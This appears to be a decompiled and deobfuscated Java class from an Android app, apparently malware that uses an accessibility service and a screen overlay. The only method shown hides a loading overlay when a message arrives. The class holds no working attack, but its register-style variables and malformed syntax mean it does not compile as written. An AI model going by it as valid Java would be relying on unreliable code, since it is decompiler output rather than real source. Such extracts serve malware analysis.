package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: LoadingScreenOverlay_2
 * Original: Lcom/tencent/Bla_tunesxconcerningn10_ck$2;
 */
class LoadingScreenOverlay_2 implements Handler$Callback; {

    // === FIELDS ===
    final AccessibilityServiceCore val$classGen12;

    // === METHODS ===

     void Constructor(AccessibilityServiceCore param0) {
        v0.val$classGen12 = v1;
        // new Object()
        return;
    }

    public boolean handleMessage(Message param0) {
        v1 = v0.val$classGen12;
        LoadingScreenOverlay.hide(v1);
        v1 = 0;
        return 0;
    }
}
